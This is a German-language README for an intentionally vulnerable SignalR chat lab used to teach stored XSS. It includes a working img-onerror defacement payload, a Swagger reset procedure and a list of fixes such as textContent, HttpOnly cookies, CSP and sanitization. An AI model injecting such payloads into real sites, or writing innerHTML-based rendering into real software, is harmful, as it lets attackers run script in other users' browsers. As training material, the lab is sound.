# 🛡️ SignalR XSS & Security Lab

Dieses Projekt ist eine absichtlich unsichere Chat-Anwendung. Sie dient als **Lernumgebung**, um Sicherheitslücken wie Cross-Site Scripting (XSS) und die Risiken von LocalStorage-basierten JWTs zu verstehen, zu demonstrieren und zu beheben.

## 🚀 Features
* **Echtzeit-Chat:** Kommunikation über **SignalR** und ASP.NET Core.
* **Dynamisches Design:** Automatische Generierung von Pastell-Farben basierend auf dem Benutzernamen.
* **Absichtliche Schwachstellen:** Demonstriert **Stored XSS** durch die Verwendung von `innerHTML` statt `textContent`.
* **Dynamische Endpunkte:** Das Frontend nutzt relative Pfade, sodass kein Hardcoding von Ports nötig ist.

## 🛠️ Installation & Start

1.  **Backend:**
    * Öffne den Ordner `SignalRChatServer` in Visual Studio oder VS Code.
    * Starte das Projekt mit `dotnet run`. Der Server läuft standardmäßig auf `http://localhost:5001`.

2.  **Frontend:**
    * Da die Dateien im `wwwroot`-Ordner des Servers liegen, öffne einfach `http://localhost:5001/index.html` in deinem Browser.
    * Gib einen Namen ein und beginne zu chatten.

---

## ☣️ Das "Hacker-Defacement" Experiment

Dieses Tutorial zeigt, wie ein Angreifer das komplette Aussehen der Webseite für alle Nutzer verändern kann ("Defacement"). Dies ist ein klassischer Weg, um Macht über eine Webpräsenz zu demonstrieren.

### Der Angriff:
Kopiere diesen Payload in das Chat-Eingabefeld. Sobald andere Nutzer diese Nachricht empfangen, verwandelt sich ihr Chat-Fenster in einen "Hacked"-Screen mit Matrix-Vibe.

```html
<img src=x onerror="
    /* Die Seite komplett schwarz machen und Hacker-Style erzwingen */
    document.body.innerHTML = `
        <div style='position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:#0f0;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:monospace;text-shadow:0 0 5px #0f0;'>
            <h1 style='font-size:50px;'>⚠️ SYSTEM CRITICAL ⚠️</h1>
            <h2 style='font-size:30px;'>HACKED BY [DEIN NAME HIER]</h2>
            <p style='font-size:18px;margin-top:20px;'>ACCESS DENIED. ALL DATA ENCRYPTED.</p>
            <div id='matrix' style='margin-top:30px;font-size:12px;opacity:0.5;'></div>
            <button onclick='location.reload()' style='margin-top:40px;background:transparent;border:1px solid #0f0;color:#0f0;padding:10px 20px;cursor:pointer;'>System neustarten?</button>
        </div>`;
    
    /* Ein kleiner Matrix-Effekt im Hintergrund */
    setInterval(() => {
        document.getElementById('matrix').innerHTML += Math.random().toString(2).substring(2, 10) + ' ';
    }, 100);
">
```

### 🔄 Notfall-Reset via Swagger

Sollte ein Angriff die Website komplett unbrauchbar gemacht haben, kannst du das System jederzeit zurücksetzen. Da die Nachrichten direkt aus der Datenbank geladen werden, löscht ein Reset der DB-Einträge auch den bösartigen Code:

1.  Navigiere zu http://localhost:5001/swagger.
    
2.  Suche den **DELETE** Endpoint unter /messages.
    
3.  Klicke auf **Try it out** und dann auf **Execute**.
    
4.  Lade den Chat neu – alle injizierten Skripte sind nun entfernt.
    

🔒 Wie man es richtig macht (The Fix)
-------------------------------------

In einer produktiven App sollten folgende Punkte umgesetzt werden:

*   **Kein innerHTML:** Verwende in script.js konsequent .textContent statt .innerHTML. Dies ist die wichtigste Verteidigung gegen XSS.
    
*   **HttpOnly Cookies:** Speichere JWTs niemals im localStorage. Nutze **HttpOnly Cookies**, damit JavaScript keinen Zugriff auf die Session-Token hat.
    
*   **CSP (Content Security Policy):** Implementiere einen **CSP-Header**, der Inline-Skripte wie onerror blockiert.
    
*   **Backend Sanitization:** Nutze Bibliotheken wie **Ganss.XSS** im Backend, um Nachrichten zu filtern, bevor sie gespeichert werden.
    

> \[!WARNING\]**Warnung:** Dieses Projekt dient ausschließlich zu Bildungszwecken. Das Ausführen von XSS-Angriffen auf fremde Systeme ohne Erlaubnis ist illegal.
